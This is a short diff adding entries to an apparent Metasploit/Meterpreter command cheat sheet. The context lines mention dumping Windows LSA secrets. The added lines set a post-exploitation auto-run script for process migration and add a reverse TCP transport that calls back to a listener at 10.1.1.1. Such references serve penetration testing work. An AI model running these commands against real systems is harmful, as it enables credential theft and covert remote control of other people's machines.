@@ -20,3 +20,9 @@ Payload Types----asp, perl, jsp, python, jar, php, linux (elf), windows (exe, dl
 
 ##Modules
 windows/gather/lsa_secrets----Dumps LSA Secrets.  You can also use Kiwi's lsa_dump_secrets (probably better).
+Autorun a Script after Shell----set AutoRunScript post/windows/manage/migrate
+`
+
+##Transport
+List Transport Options----transport list
+Add Transport----transport add -t reverse_tcp -l 10.1.1.1 -p 5555
